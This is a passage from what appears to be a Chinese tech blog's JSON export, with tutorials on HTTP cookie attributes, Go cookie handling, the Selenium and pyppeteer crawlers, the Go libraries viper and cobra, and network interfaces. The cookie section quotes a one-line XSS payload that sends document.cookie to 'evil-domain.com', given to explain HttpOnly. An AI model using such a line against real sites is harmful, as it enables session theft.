Expires，Max-Age\n\n`Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n```\n\n如果不设置该属性，或者设为`null`，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。\n\n\n\n`Max-Age`属性指定从现在开始 Cookie 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。\n\n如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。\n\n如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。\n\n\n\n> 1.3.2 Domain，Path\n\n`Domain`属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如`www.example.com`会设为`example.com`，而且以后如果访问`example.com`的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在`Set-Cookie`字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。\n\n\n\n`Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，`PATH`属性是`/`，那么请求`/docs`路径也会包含该 Cookie。当然，前提是域名必须一致。\n\n\n\n> 1.3.3 Secure，HttpOnly\n\n`Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。\n\n`HttpOnly`属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是`Document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的`HttpOnly`属性，上面代码就不会读到该 Cookie。\n\n\n\n##### 1.4 document.cookie\n\n`document.cookie`属性用于读写当前网页的 Cookie。\n\n读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。\n\n```\ndocument.cookie // \"foo=bar;baz=bar\"\n```\n\n上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。\n\n```\nvar cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n```\n\n`document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。\n\n```\ndocument.cookie = 'fontSize=14';\n```\n\n写入的时候，Cookie 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用`encodeURIComponent`方法达到。\n\n但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。\n\n```\ndocument.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie\n// test1=hello;test2=world\n```\n\n`document.cookie`读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，`Cookie`字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，`Set-Cookie`字段是一行设置一个 Cookie。\n\n\n\n写入 Cookie 的时候，可以一起写入 Cookie 的属性。\n\n```\ndocument.cookie = \"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT\";\n```\n\n\n\n上面代码中，写入 Cookie 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。\n\n各个属性的写入注意点如下。\n\n- `path`属性必须为绝对路径，默认为当前路径。\n- `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。\n- `max-age`属性的值为秒数。\n- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。\n\n\n\n`document.cookie`写入 Cookie 的例子如下。\n\n```\ndocument.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n```\n\nCookie 的属性一旦设置完成，就没有办法读取这些属性的值。\n\n删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。\n\n```\ndocument.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n```\n\n上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。\n\n\n\n### 2. golang 使用 cookie\n\n+ cookie的结构体如下:\n\n``` go\ntype Cookie struct {\n    Name  string\n    Value string\n\n    Path       string    // optional\n    Domain     string    // optional\n    Expires    time.Time // optional\n    RawExpires string    // for reading cookies only\n\n    // MaxAge=0 means no 'Max-Age' attribute specified.\n    // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'\n    // MaxAge>0 means Max-Age attribute present and given in seconds\n    MaxAge   int\n    Secure   bool\n    HttpOnly bool\n    Raw      string\n    Unparsed []string // Raw text of unparsed attribute-value pairs\n}\n```\n\n+ cookie 操作\n\n```go\n//设置Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   3600 * 24,\n\t\tHttpOnly: true,\n\t})\n\n//读取Cookie\ncookie, err := req.Cookie(\"auth_token\")\n\n//删除Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   -1,\n\t\tHttpOnly: true,\n\t})\n```\n\n\n\n### 3. 参考资料\n\n+ https://studygolang.com/articles/5905\n\n+ https://javascript.ruanyifeng.com/bom/cookie.html\n\n","tags":["cookie"],"categories":["Web"]},{"title":"爬虫利器selenium和无头浏览器的使用","url":"%2Fp%2F545fa06.html","content":"\n\n\n### 0. 前言\n\nSelenium 的初衷是打造一款优秀的自动化测试工具，但是慢慢的人们就发现，Selenium 的自动化用来做爬虫正合适。我们知道，传统的爬虫通过直接模拟 HTTP 请求来爬取站点信息，由于这种方式和浏览器访问差异比较明显，很多站点都采取了一些反爬的手段，而 Selenium 是通过模拟浏览器来爬取信息，其行为和用户几乎一样，反爬策略也很难区分出请求到底是来自 Selenium 还是真实用户。\n\n\n\n通过 Selenium 来做爬虫，不用去分析每个请求的具体参数，比起传统的爬虫开发起来更容易。Selenium 爬虫唯一的不足是慢，如果你对爬虫的速度没有要求，那使用 Selenium 是个非常不错的选择。\n\n<!-- more -->\n\n### 1. 安装和使用\n\n```bash\npip install selenium \n```\n\n\n\n##### 1.1 页面操作\n\n```python\n# 输入数据\nbrowser.find_element_by_css_selector('.rfm input[name=\"username\"]').send_keys('123456')\n\n# 选择数据\nbrowser.find_element_by_xpath(\"//select[@name='questionid']/option[text()='父亲的手机号码']\").click()\n\n# 敲回车\nbrowser.find_element_by_css_selector('button[name=\"loginsubmit\"]').send_keys(Keys.ENTER)\n\n\n# 只等3秒\nbrowser.implicitly_wait(3)\n\n# 获取cookie\ncookies_list = driver.get_cookies()\ncookies_dict = {}\nfor cookie in cookies_list:\n    cookies_dict[cookie['name']] = cookie['value']\nprint(cookies_dict)\n```\n\n\n\n### 2. 遇到的问题\n\n\n\n##### 2.1 [ImportError: cannot import name 'webdriver'](https://stackoverflow.com/questions/29092970/importerror-cannot-import-name-webdriver)\n\n文件不能命名为`selenium`\n\n\n\n##### 2.2  Message: 'chromedriver' executable needs to be in PATH.\n\n下载驱动 https://sites.google.com/a/chromium.org/chromedriver/downloads\n\n\n\n##### 2.3 Message: unknown error: cannot find Chrome binary\n\n+ centos 安装 chrome\n\n  ```bash\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm\n  sudo yum localinstall google-chrome-stable_current_x86_64.rpm\n  google-chrome --no-sandbox --version # 看到版本后去下载相关的driver\n  ```\n\n+ ubuntu 安装 chrome\n\n  ```\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\n  sudo apt install ./google-chrome-stable_current_amd64.deb\ngoogle-chrome --no-sandbox --version\n  ```\n  \n  \n\n\n\n### 3. 参考资料\n\n+ https://cuiqingcai.com/2599.html\n\n+ [Python3中Selenium使用方法](https://zhuanlan.zhihu.com/p/29435831)\n\n\n+ [使用 Python + Selenium 打造浏览器爬虫](https://www.aneasystone.com/archives/2018/02/python-selenium-spider.html)","tags":["爬虫"],"categories":["爬虫"]},{"title":"golang配置信息库viper的使用","url":"%2Fp%2Fe2f28eb4.html","content":"\n\n\n### 0. 前言\n\nViper(毒蛇)是一个方便Go语言应用程序处理配置信息的库。它可以处理多种格式的配置。它支持的特性：\n\n- 设置默认值\n- 从JSON，TOML，YAML，HCL和Java属性配置文件中读取\n- 实时观看和重新读取配置文件（可选）\n- 从环境变量中读取\n- 从远程配置系统（etcd或Consul）读取，并观察变化\n- 从命令行标志读取\n- 从缓冲区读取\n- 设置显式值\n\n<!-- more -->\n\nViper读取配置信息的优先级顺序，从高到低，如下：\n\n- 显式调用Set函数\n- 命令行参数\n- 环境变量\n- 配置文件\n- key/value 存储系统\n- 默认值\n\nViper 的配置项的key不区分大小写。\n\n\n\n### 1. 安装使用\n\n##### 1.0 安装\n\n```bash\ngo get -u github.com/spf13/viper\n```\n\n\n\n##### 1.1 设置默认值\n\n默认值不是必须的，如果配置文件、环境变量、远程配置系统、命令行参数、Set函数都没有指定时，默认值将起作用。\n\n```go\nviper.SetDefault(\"ContentDir\", \"content\")\nviper.SetDefault(\"LayoutDir\", \"layouts\")\nviper.SetDefault(\"Taxonomies\", map[string]string{\"tag\": \"tags\", \"category\": \"categories\"})\n```\n\n\n\n##### 1.2 读取配置文件\n\nViper支持JSON、TOML、YAML、HCL和Java properties文件。\nViper可以搜索多个路径，但目前单个Viper实例仅支持单个配置文件。\nViper默认不搜索任何路径。\n以下是如何使用Viper搜索和读取配置文件的示例。\n路径不是必需的，但最好至少应提供一个路径，以便找到一个配置文件。\n\n```go\nviper.SetConfigName(\"config\") //  设置配置文件名 (不带后缀)\nviper.AddConfigPath(\"/etc/appname/\")   // 第一个搜索路径\nviper.AddConfigPath(\"$HOME/.appname\")  // 可以多次调用添加路径\nviper.AddConfigPath(\".\")               // 比如添加当前目录\nerr := viper.ReadInConfig() // 搜索路径，并读取配置数据\nif err != nil {\n    panic(fmt.Errorf(\"Fatal error config file: %s \\n\", err))\n}\n```\n\n\n\n##### 1.3 监视配置文件，重新读取配置数据\n\nViper支持让您的应用程序在运行时拥有读取配置文件的能力。\n需要重新启动服务器以使配置生效的日子已经一去不复返了，由viper驱动的应用程序可以在运行时读取已更新的配置文件，并且不会错过任何节拍。\n只需要调用viper实例的WatchConfig函数，你也可以指定一个回调函数来获得变动的通知。\n\n```go\nviper.WatchConfig()\nviper.OnConfigChange(func(e fsnotify.Event) {\n    fmt.Println(\"Config file changed:\", e.Name)\n})\n```\n\n\n\n##### 1.4 从 io.Reader 中读取配置\n\nViper预先定义了许多配置源，例如文件、环境变量、命令行参数和远程K / V存储系统，但您并未受其约束。\n您也可以实现自己的配置源，并提供给viper。\n\n```go\nviper.SetConfigType(\"yaml\") // or viper.SetConfigType(\"YAML\")\n\n// any approach to require this configuration into your program.\nvar yamlExample = []byte(`\nHacker: true\nname: steve\nhobbies:\n- skateboarding\n- snowboarding\n- go\nclothing:\n  jacket: leather\n  trousers: denim\nage: 35\neyes : brown\nbeard: true\n`)\n\nviper.ReadConfig(bytes.NewBuffer(yamlExample))\nviper.Get(\"name\") // 返回 \"steve\"\n```\n\n\n\n##### 1.5 注册并使用别名\n\n```go\nviper.RegisterAlias(\"loud\", \"Verbose\")\n\nviper.Set(\"verbose\", true) \nviper.Set(\"loud\", true)   // 这两句设置的都是同一个值\n\nviper.GetBool(\"loud\") // true\nviper.GetBool(\"verbose\") // true\n```\n\n\n\n##### 1.6 从环境变量中读取\n\nViper 完全支持环境变量，这是的应用程序可以开箱即用。\n有四个和环境变量有关的方法：\n\n+ AutomaticEnv()\n+ BindEnv(string...) : error\n+ SetEnvPrefix(string)\n+ SetEnvKeyReplacer(string...) *strings.Replacer\n\n注意，环境变量时区分大小写的。\n\nViper提供了一种机制来确保Env变量是唯一的。通过SetEnvPrefix，在从环境变量读取时会添加设置的前缀。BindEnv和AutomaticEnv都会使用到这个前缀。\n\nBindEnv需要一个或两个参数。第一个参数是键名，第二个参数是环境变量的名称。环境变量的名称区分大小写。如果未提供ENV变量名称，则Viper会自动假定该键名称与ENV变量名称匹配，并且ENV变量为全部大写。当您显式提供ENV变量名称时，它不会自动添加前缀。\n\n使用ENV变量时要注意，当关联后，每次访问时都会读取该ENV值。Viper在BindEnv调用时不读取ENV值。\n\nAutomaticEnv与SetEnvPrefix结合将会特别有用。当AutomaticEnv被调用时，任何viper.Get请求都会去获取环境变量。环境变量名为SetEnvPrefix设置的前缀，加上对应名称的大写。\n\nSetEnvKeyReplacer允许你使用一个strings.Replacer对象来将配置名重写为Env名。如果你想在Get()中使用包含-的配置名 ，但希望对应的环境变量名包含_分隔符，就可以使用该方法。使用它的一个例子可以在项目中viper_test.go文件里找到。\n例子：\n\n```go\nSetEnvPrefix(\"spf\") // 将会自动转为大写\nBindEnv(\"id\")\n\nos.Setenv(\"SPF_ID\", \"13\") // 通常通过系统环境变量来设置\n\nid := Get(\"id\") // 13\n```\n\n\n\n##### 1.7 绑定命令行参数\n\nViper支持绑定pflags参数。\n和BindEnv一样，当绑定方法被调用时，该值没有被获取，而是在被访问时获取。这意味着应该尽早进行绑定，甚至是在init()函数中绑定。\n\n利用BindPFlag()方法可以绑定单个flag。例子：\n\n```go\nserverCmd.Flags().Int(\"port\", 1138, \"Port to run Application server on\")\nviper.BindPFlag(\"port\", serverCmd.Flags().Lookup(\"port\"))\n```\n\n\n你也可以绑定已存在的pflag集合 (pflag.FlagSet):\n\n```go\npflag.Int(\"flagname\", 1234, \"help message for flagname\")\n\npflag.Parse()\nviper.BindPFlags(pflag.CommandLine)\n\ni := viper.GetInt(\"flagname\") // 通过viper从pflag中获取值\n```\n\n\n使用pflag并不影响其他库使用标准库中的flag。通过导入，pflag可以接管通过标准库的flag定义的参数。这是通`过调用pflag包中的AddGoFlagSet()方法实现的。例子：\n\n```go\npackage main\n\nimport (\n    \"flag\"\n    \"github.com/spf13/pflag\"\n)\n\nfunc main() {\n\n    // using standard library \"flag\" package\n    flag.Int(\"flagname\", 1234, \"help message for flagname\")\n\n    pflag.CommandLine.AddGoFlagSet(flag.CommandLine)\n    pflag.Parse()\n    viper.BindPFlags(pflag.CommandLine)\n\n    i := viper.GetInt(\"flagname\") // retrieve value from viper\n\n    ...\n}\n```\n\n\n\n##### 1.8 获取值\n\n在Viper中，有一些根据值的类型获取值的方法。存在一下方法：\n\n+ Get(key string) : interface{}\n\n+ GetBool(key string) : bool\n\n+ GetFloat64(key string) : float64\n\n+ GetInt(key string) : int\n\n+ GetString(key string) : string\n\n+ GetStringMap(key string) : map[string]interface{}\n\n+ GetStringMapString(key string) : map[string]string\n\n+ GetStringSlice(key string) : []string\n\n+ GetTime(key string) : time.Time\n\n+ GetDuration(key string) : time.Duration\n\n+ IsSet(key string) : bool\n\n\n如果Get函数未找到值，则返回对应类型的一个零值。可以通过 IsSet() 方法来检测一个健是否存在。例子:\n\n```go\nviper.GetString(\"logfile\") // Setting & Getting 不区分大小写\nif viper.GetBool(\"verbose\") {\n    fmt.Println(\"verbose enabled\")\n}\n```\n\n\n\n##### 1.9 访问嵌套键\n\n访问方法也接受嵌套的键。例如，如果加载了以下JSON文件：\n\n```json\n{\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n```\n\n\nViper可以通过.分隔符来访问嵌套的字段：\n\n```go\nGetString(\"datastore.metric.host\") // (returns \"127.0.0.1\")\n```\n\n\n这遵守前面确立的优先规则; 会搜索路径中所有配置，直到找到为止。\n例如，上面的文件，datastore.metric.host和 datastore.metric.port都已经定义（并且可能被覆盖）。如果另外 datastore.metric.protocol的默认值，Viper也会找到它。\n\n但是，如果datastore.metric值被覆盖（通过标志，环境变量，Set方法，...），则所有datastore.metric的子键将会未定义，它们被优先级更高的配置值所“遮蔽”。\n\n最后，如果存在相匹配的嵌套键，则其值将被返回。例如：\n\n```json\n{\n    \"datastore.metric.host\": \"0.0.0.0\",\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n\nGetString(\"datastore.metric.host\") // returns \"0.0.0.0\"\n```\n\n\n\n### 3. 参考资料\n\n+ [Golang的配置信息处理框架Viper](https://blog.51cto.com/13599072/2072753)\n+ https://www.jishuwen.com/d/2vNk","tags":["viper"],"categories":["golang"]},{"title":"golang命令行库cobra的使用","url":"%2Fp%2Fd50935d7.html","content":"\n### 0. 前言\n\nCobra(眼镜蛇)是一个库，其提供简单的接口来创建强大现代的CLI接口，类似于git或者go工具。同时，它也是一个应用，用来生成个人应用框架，从而开发以Cobra为基础的应用。Docker源码中使用了Cobra。\n\nCobra基于三个基本概念`commands`,`arguments`和`flags`。其中commands代表行为，arguments代表数值，flags代表对行为的改变。\n\n基本模型如下：\n\n```bash\nAPPNAME COMMAND ARG --FLAG\n\n# hugo是cmmands server是commands，port是flag\nhugo server --port=1313\n\n# clone是commands，URL是arguments，brae是flags\ngit clone URL --bare\n```\n\n\n<!-- more -->\n\n\n\n### 1. 安装和使用\n\n安装:\n\n```bash\ngo get -u github.com/spf13/cobra/cobra\n```\n\n\n\n你的项目结构可能如下:\n\n```bash\n  ▾ appName/\n    ▾ cmd/\n        root.go\n        version.go\n        commands.go\n      main.go\n```\n\n\n\n##### 1.1 main.go\n\nIn a Cobra app, typically the main.go file is very bare(裸露). It serves one purpose: initializing Cobra.\n\n```go\npackage main\n\nimport (\n  \"appName/cmd\"\n)\n\nfunc main() {\n  cmd.Execute()\n}\n```\n\n\n\n##### 1.2 rootcmd\n\n```go\nvar rootCmd = &cobra.Command{\n  Use:   \"hugo\",\n  Short: \"Hugo is a very fast static site generator\",\n  Long: `A Fast and Flexible Static Site Generator built with\n                love by spf13 and friends in Go.\n                Complete documentation is available at http://hugo.spf13.com`,\n  Run: func(cmd *cobra.Command, args []string) {\n    // Do Stuff Here\n  },\n}\n\nfunc Execute() {\n  if err := rootCmd.Execute(); err != nil {\n    fmt.Println(err)\n    os.Exit(1)\n  }\n}\n```\n\n\n\n##### 1.3 additional commands\n\n```go\npackage cmd\n\nimport (\n  \"fmt\"\n\n  \"github.com/spf13/cobra\"\n)\n\nfunc init() {\n  rootCmd.AddCommand(versionCmd)\n}\n\nvar versionCmd = &cobra.Command{\n  Use:   \"version\",\n  Short: \"Print the version number of Hugo\",\n  Long:  `All software has versions. This is Hugo's`,\n  Run: func(cmd *cobra.Command, args []string) {\n    fmt.Println(\"Hugo Static Site Generator v0.9 -- HEAD\")\n  },\n}\n```\n\n\n\n可以简单执行下面命令查看效果\n\n```bash\ngo run main.go help\ngo run main.go version\n```\n\n\n\n### 3. cobra 生成器\n\n在文件夹github.com/spf13/cobra/cobra下使用go install, 生成 cobra命令\n\n命令`cobra init [yourApp]`将会创建初始化应用，yourApp 是你的项目名称。它会在你的 GOPATH 目录下面生成项目。最新的操作方式:\n\n```bash\ncd /Users/liuwei/golang/src/github.com/unix2dos/golangTest\ncobra init --pkg-name=github.com/unix2dos/golangTest yourApp\n```\n\n\n\n接下来我们用`cobra add`来添加一些子命令。在你项目的目录下，运行下面这些命令：\n\n```bash\ncobra add serve\ncobra add config\ncobra add create -p 'configCmd'\n```\n\n这样以后，你就可以运行上面那些 app serve 之类的命令了。项目目录如下：\n\n```bash\n▾ app/\n  ▾ cmd/\n      serve.go\n      config.go\n      create.go\n    main.go\n```\n\n\n\n### 4. 使用Flags\n\ncobra 有两种 flag，一个是全局变量，一个是局部变量。全局什么意思呢，就是所以子命令都可以用。局部的只有自己能用。先看全局的：\n\n```go\nRootCmd.PersistentFlags().StringVar(&cfgFile, \"config\", \"\", \"config file (default is $HOME/.cobra_exp1.yaml)\")\n```\n\n在看局部的：\n\n```go\nRootCmd.Flags().BoolP(\"toggle\", \"t\", false, \"Help message for toggle\")\n```\n\n区别就在 RootCmd 后面的是 Flags 还是 PersistentFlags。\n\n\n\n### 5. 参考资料\n\n+ [Golang之使用Cobra](https://o-my-chenjian.com/2017/09/20/Using-Cobra-With-Golang/)\n\n+ https://www.kancloud.cn/liupengjie/go/1010466","tags":["cobra"],"categories":["golang"]},{"title":"网络接口介绍","url":"%2Fp%2F9dad86f4.html","content":"\n### 1. 网络接口介绍\n\n##### 1.1 网络接口的命名\n\n网络接口并不存在一定的命名规范，但网络接口名字的定义一般都是要有意义的。例如：\n\n+ eth0: ethernet的简写，一般用于以太网接口。\n\n+ wifi0:wifi是无线局域网，因此wifi0一般指无线网络接口。\n\n+ ath0: Atheros的简写，一般指Atheros芯片所包含的无线网络接口。\n\n+ lo: local的简写，一般指本地环回接口。\n\n<!-- more -->\n\n##### 1.2 网络接口如何工作\n\n网络接口是用来发送和接受数据包的基本设备。\n\n系统中的所有网络接口组成一个链状结构，应用层程序使用时按名称调用。\n\n每个网络接口在linux系统中对应于一个struct net_device结构体，包含name,mac,mask,mtu…信息。\n\n每个硬件网卡(一个MAC)对应一个网络接口，其工作完全由相应的驱动程序控制。\n\n##### 1.3 虚拟网络接口\n\n虚拟网络接口的应用范围非常广泛。最着名的当属“lo”了，基本上每个linux系统都有这个接口。\n\n虚拟网络接口并不真实地从外界接收和发送数据包，而是在系统内部接收和发送数据包，因此虚拟网络接口不需要驱动程序。\n\n虚拟网络接口和真实存在的网络接口在使用上是一致的。\n\n##### 1.4 网络接口的创建\n\n硬件网卡的网络接口由驱动程序创建。而虚拟的网络接口由系统创建或通过应用层程序创建。\n\n驱动中创建网络接口的函数是：`register_netdev(struct net_device *)`或者`register_netdevice(struct net_device *)`。\n\n这两个函数的区别是：register_netdev(…)会自动生成以”eth”作为打头名称的接口，而register_netdevice(…)需要提前指定接口名称.事实上，register_netdev(…)也是通过调用register_netdevice(…)实现的。\n\n\n\n### 2. mac的网络接口\n\n- lo0 = loopback > 回环接口或者 本地主机(localhost)\n- gif0 = Software Network Interface > 通用 IP-in-IP隧道(RFC2893)\n- stf0 = 6to4 tunnel interface > 6to4连接(RFC3056)\n- en0 = Ethernet 0 > 以太网或802.11接口\n- fw0 = Firewire > IP over FireWire(IEEE-1394), macOS特有\n- en1 = Ethernet 1 > \n- vmnet8 = Virtual Interface > 虚拟网卡8\n- vmnet1 = Virtual Interface > 虚拟网卡1\n- p2p Point-to-Point 协议\n- awdl airdrop peer to peer(一种mesh network), apple airdrop设备特有\n- bridge 第2层桥接\n- vlan 虚拟局域网络\n\n在iOS设备(支持cellular)上还能看到\n\n+ pdp_ip 蜂窝数据连接\n\n那en0 en1 en2 en3 en4 怎么这么多？？？ 运行一下命令： \n\n```bash\nnetworksetup -listallhardwareports\n\nHardware Port: Wi-Fi\nDevice: en0\nEthernet Address: c4:b3:01:bd:ad:1d\n\nHardware Port: Bluetooth PAN\nDevice: en3\nEthernet Address: c4:b3:01:bd:ad:1e\n\nHardware Port: Thunderbolt 1\nDevice: en1\nEthernet Address: 4a:00:07:4d:b2:b0\n\nHardware Port: Thunderbolt 2\nDevice: en2\nEthernet Address: 4a:00:07:4d:b2:b1\n\nHardware Port: Thunderbolt Bridge\nDevice: bridge0\nEthernet Address: 4a:00:07:4d:b2:b0\n```\n\n原来是Wi-Fi，蓝牙，thunderbolt…\n\n\n\n### 3. ifconfig 命令\n\n```bash\n[root@localhost ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:BF:26:20  \n          inet addr:192.168.120.204  Bcast:192.168.120.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:596390239 (568.7 MiB)  TX bytes:2886956 (2.7 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:68 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:68 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:2856 (2.7 KiB)  TX bytes:2856 (2.7 KiB)\n```\n\n第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）\n\n第二行：网卡的IP地址、子网、掩码\n\n第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节\n\n第四、五行：接收、发送数据包情况统计\n\n第七行：接收、发送数据字节数统计信息。\n\n\n\n其他说明:\n\n+ eth0 表示第一块网卡， 其中 HWaddr 表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是 00:50:56:BF:26:20\n\n+ inet addr 用来表示网卡的IP地址，此网卡的 IP地址是 192.168.120.204，广播地址， Bcast:192.168.120.255，掩码地址Mask:255.255.255.0 \n\n+ lo 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 HTTPD服务器的指定到回坏地址，在浏览器输入 127.0.0.1 就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。\n\n\n\n### 4. 参考资料\n\n+ [Linux中的lo回环接口详细介绍](https://blog.csdn.net/huguohu2006/article/details/7261106)\n\n+ [ifconfig命令](http://www.voidcn.com/article/p-ehcsampr-bmr.html)\n\n+ [ifconfig output in Mac OS X?](https://superuser.com/questions/267660/can-someone-please-explain-ifconfig-output-in-mac-os-x)\n","tags":["网络接口"],"categories":["计算机基础"]},{"title":"python爬虫利器pyppeteer的使用","url":"%2Fp%2F6b1ba1b4.html","content":"\n\n\n### 0. 前言\n\nChrome59(linux、macos)、 Chrome60(windows)之后，Chrome自带[headless(无界面)模式](https://developers.google.com/web/updates/2017/04/headless-chrome)很方便做自动化测试或者爬虫。但是如何和headless模式的Chrome交互则是一个问题。通过启动Chrome时的命令行参数仅能实现简易的启动时初始化操作。Selenium、Webdriver等是一种解决方案，但是往往依赖众多，不够扁平。\n\n\n\npuppeteer是谷歌官方出品的一个通过DevTools协议控制headless Chrome的Node库。可以通过puppeteer的提供的api直接控制Chrome模拟大部分用户操作来进行UI Test或者作为爬虫访问页面来收集数据。\n\n\n\npyperteer是puppeteer的Python实现，相比于selenium具有异步加载、速度快、具备有界面/无界面模式、伪装性更强不易被识别为机器人同时可以伪装手机平板等终端；但是也有一些缺点，如接口不易理解、语义晦涩；\n\n<!-- more -->\n\n\n\n### 1. pyppeteer使用\n\n```bash\npip3 install pyppeteer\n```\n\n\n\n\n\n##### 1.1 无头模式\n\n```python\nbrowser = await launch({'headless': False, 'args': ['--no-sandbox']})\n```\n\nheadless=True, 不弹出浏览器, 测试阶段可以设置为 False 观测\n\n##### 1.2 page方法\n\n```bash\npage.click 点击\npage.type 输入\npage.select 下拉框\n\n\npage.click('.rfm input[name=\"cookietime\"]')\n```\n\n对于 page方法内的选择元素语法请参考:  https://www.w3schools.com/cssref/css_selectors.asp\n\n\n\n### 2. pyppeteer  linux运行问题\n\n##### 2.1 centos无法运行pyppeteer\n\n```\nyum -y install libX11 libXcomposite libXcursor libXdamage libXext libXi libXtst cups-libs libXScrnSaver libXrandr alsa-lib pango atk at-spi2-atk gtk3 \n```\n\n\n\n##### 2.2 Bad NaCl helper startup ack\n\n```\nERROR:nacl_fork_delegate_linux.cc(314)] Bad NaCl helper startup ack (0 bytes)\\n\\n(chrome:24935)\n```\n\n使用无头模式\n\n\n\n##### 2.3 Navigation Timeout Exceeded: 30000 ms exceeded\n\n```\nawait page.goto(\"https://www.baidu.com\", timeout=0)\n```\n\n+ 加上timeout\n\n+ 检测封禁 ip\n\n\n\n\n\n### 3. pyppeteer 问题解决方案\n\n##### 3.1 抓取js 渲染后的数据\n\n使用 requests 是无法正常抓取到相关数据的。因为什么？因为这个页面是 JavaScript 渲染而成的，我们所看到的内容都是网页加载后又执行了 JavaScript 之后才呈现出来的，因此这些条目数据并不存在于原始 HTML 代码中，而 requests 仅仅抓取的是原始 HTML 代码。\n\n好的，所以遇到这种类型的网站我们应该怎么办呢？\n\n其实答案有很多：\n\n- 